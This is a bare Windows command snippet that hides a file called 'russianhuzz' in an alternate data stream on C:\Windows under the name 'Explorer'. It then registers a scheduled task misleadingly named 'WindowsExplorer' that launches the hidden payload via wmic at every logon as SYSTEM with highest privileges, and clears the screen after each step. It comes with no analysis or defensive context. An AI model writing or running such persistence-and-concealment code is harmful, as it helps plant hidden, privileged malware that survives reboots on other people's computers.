type russianhuzz > C:\Windows:Explorer
Clear-Host
schtasks /create /tn "WindowsExplorer" /tr "C:\Windows\System32\cmd.exe /c wmic process call create \"C:\Windows:Explorer\"" /sc onlogon /ru "SYSTEM" /rl highest /f
Clear-Host
